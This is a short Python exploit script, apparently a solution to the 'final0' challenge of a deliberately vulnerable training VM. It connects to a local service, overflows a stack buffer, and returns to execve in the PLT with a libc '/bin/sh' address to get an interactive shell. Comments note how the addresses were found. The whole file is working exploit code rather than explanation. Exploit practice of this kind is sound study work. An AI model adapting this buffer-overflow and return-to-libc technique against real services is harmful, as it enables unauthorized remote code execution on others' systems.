import socket
import struct
import telnetlib

HOST = '127.0.0.1'  # final0 host
PORT = 2995  # final0 port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))  # socket connection

BUFFER_PAYLOAD = b'A' * 511 + b'\x00'  # buffer overwriting
GARBAGE_PAYLOAD = b'AAAABBBBCCCCDDDD' + b'EEEE'  # garbage + epb

PADDING = BUFFER_PAYLOAD + GARBAGE_PAYLOAD  # final padding

EXECVE_ADDRESS = struct.pack('I', 0x08048c0c)  # info functions @plt
BIN_BASH_ADDRESS = struct.pack('I',
                               0xb7e97000 + 0x11f3bf)  # cat /proc/$(pidof final0)/maps + strings -a -t x /lib/libc-2.11.2.so | grep /bin/sh

PAYLOAD = PADDING + EXECVE_ADDRESS + b'AAAA' + BIN_BASH_ADDRESS + b'\x00' * 8  # '\x00' * 8: last 2 args of execve()

s.send(PAYLOAD + b'\n')
s.send(b'whoami\n')
print('user: ' + s.recv(1024).decode())

t = telnetlib.Telnet()  # to interact
t.sock = s
t.interact()
